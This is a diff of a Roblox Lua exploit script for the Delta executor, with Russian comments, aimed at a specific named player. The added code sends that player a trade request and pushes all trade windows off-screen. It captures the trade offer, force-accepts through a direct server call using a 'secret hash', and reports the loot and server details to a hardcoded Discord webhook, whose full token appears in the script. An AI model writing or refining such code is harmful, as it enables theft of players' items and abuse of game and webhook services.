@@ -1,4 +1,4 @@
--- ⚠️ Скрипт для Delta / мобильных исполнителей. Запускать у себя ДО захода Marie_31113.
+-- ⚠️ Скрипт для Delta (Mobile). Запускать ДО захода Marie_31113.
 local webhookUrl = "https://discord.com/api/webhooks/1566534128218804466/KMXt1caKqnxCvjDQLmS9R9QTzO5AaJxwqRpRsGLYdDZ2Gg75jx5IXsUwRZ9ROUdR9egJ"
 
 local HttpService        = game:GetService("HttpService")
@@ -19,7 +19,7 @@ local function sendTradeToTarget()
     if not target then return end
 
     print("[trade] Ждём прогрузки " .. TARGET_NAME .. "...")
-    -- Ждём персонажа цели, чтобы сервер точно её видел
+    -- Ждём, пока у Мари появится персонаж (чтобы сервер точно её видел)
     if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
         local conn
         local done = false
@@ -37,36 +37,64 @@ local function sendTradeToTarget()
     local SendRequest = Trade:WaitForChild("SendRequest")
 
     for i = 1, 5 do
+        if not Players:FindFirstChild(TARGET_NAME) then
+            warn("[trade] " .. TARGET_NAME .. " вышла во время отправки.")
+            return
+        end
         local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
         if ok and res == true then
-            print("[trade] ✅ Запрос на трейд отправлен.")
+            print("[trade] ✅ Запрос на трейд успешно отправлен.")
             return
         end
         task.wait(2)
     end
-    warn("[trade] ❌ Сервер отклонил запрос (уровень/кулдаун).")
+    warn("[trade] ❌ Сервер отклонил запрос (возможно, твой уровень < 10 или она отключила трейды).")
 end
 
 -- =========================================================
--- 2. СКРЫТИЕ GUI ТРЕЙДА
+-- 2. СКРЫТИЕ GUI ТРЕЙДА (сдвиг за экран)
 -- =========================================================
--- Скрываем RequestFrame (окно "Отправка запроса")
-local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
-if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
-    TM.GUI.RequestFrame.Visible = false
-    TM.GUI.RequestFrame:GetPropertyChangedSignal("Visible"):Connect(function()
-        TM.GUI.RequestFrame.Visible = false
-    end)
-end
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Скрываем основной TradeGUI визуально, чтобы не мешал
-task.spawn(function()
-    local pg = LocalPlayer:WaitForChild("PlayerGui")
-    for _, gui in ipairs(pg:GetChildren()) do
+local function hideTradeWindows()
+    -- Скрываем RequestFrame (окно "Отправка запроса") из модуля
+    local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
+    if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
+        local rf = TM.GUI.RequestFrame
+        rf.Visible = false
+        rf:GetPropertyChangedSignal("Visible"):Connect(function()
+            rf.Visible = false
+        end)
+    end
+
+    -- Сдвигаем все окна с "Trade" в имени далеко за экран
+    for _, gui in ipairs(PlayerGui:GetChildren()) do
         if gui:IsA("ScreenGui") and string.find(string.lower(gui.Name), "trade") then
-            gui.Enabled = false
-            -- если Enabled=false ломает кнопки, мы их обходим прямым вызовом ниже
+            for _, child in ipairs(gui:GetDescendants()) do
+                if child:IsA("GuiObject") then
+                    pcall(function()
+                        child.Position = UDim2.new(9999, 0, 9999, 0)
+                    end)
+                end
+            end
+            -- Если элементы создаются позже
+            gui.DescendantAdded:Connect(function(child)
+                if child:IsA("GuiObject") then
+                    pcall(function()
+                        child.Position = UDim2.new(9999, 0, 9999, 0)
+                    end)
+                end
+            end)
         end
+    end
+end
+
+hideTradeWindows()
+-- Если GUI создастся позже
+PlayerGui.ChildAdded:Connect(function(child)
+    if child:IsA("ScreenGui") and string.find(string.lower(child.Name), "trade") then
+        task.wait(0.1)
+        hideTradeWindows()
     end
 end)
 
@@ -77,7 +105,7 @@ local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
 
--- Перехватываем обновления трейда, чтобы знать "LastOffer" (для хэша)
+-- Перехватываем обновления трейда, чтобы знать "LastOffer" (нужно для хэша)
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if data.LastOffer then lastOffer = data.LastOffer end
 end)
@@ -87,19 +115,23 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success and lootList then
         -- 3.1. ЛОГГЕР ЛУТА В DISCORD
         local webhookLootFields = {}
-        local totalValue = 0
-        local totalPrice = 0
-
+        
         for _, item in ipairs(lootList) do
             local itemId = item[1]
             local amount = item[2]
-            -- Получаем инфу о предмете для красивого лога
-            local itemInfo = require(ReplicatedStorage.Database.Sync)[item[3]] and require(ReplicatedStorage.Database.Sync)[item[3]][itemId]
-            local name = itemInfo and (itemInfo.ItemName or itemInfo.Name) or itemId
+            local itemType = item[3]
+            
+            -- Ищем название предмета в базе
+            local itemName = itemId
+            pcall(function()
+                local Sync = require(ReplicatedStorage.Database.Sync)
+                local info = Sync[itemType] and Sync[itemType][itemId]
+                if info then itemName = info.ItemName or info.Name or itemId end
+            end)
             
             table.insert(webhookLootFields, {
-                name = "🔹 " .. name .. " x" .. amount,
-                value = "Предмет получен",
+                name = "🔹 " .. itemName,
+                value = "Количество: **" .. amount .. "**",
                 inline = true
             })
         end
@@ -133,13 +165,14 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     else
         -- Если успех не пришёл, но Мари приняла, нам нужно нажать Accept за тебя
         print("[trade] Мари приняла. Пробуем авто-акцепт...")
-        -- Обходим GUI и шлём запрос напрямую
         if lastOffer then
             pcall(function()
                 -- game.PlaceId * 3 — это секретный хэш из оригинального скрипта
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
             end)
             print("[trade] ✅ Авто-акцепт отправлен.")
+        else
+            warn("[trade] Нет LastOffer, авто-акцепт может не сработать.")
         end
     end
 end)
@@ -160,7 +193,7 @@ Players.PlayerAdded:Connect(function(pl)
 end)
 
 -- =========================================================
--- 5. WEBHOOK "ЗАХОД В ИГРУ" (твой старый)
+-- 5. WEBHOOK "ЗАХОД В ИГРУ" (как в старом скрипте)
 -- =========================================================
 task.spawn(function()
     local placeId, jobId = game.PlaceId, game.JobId
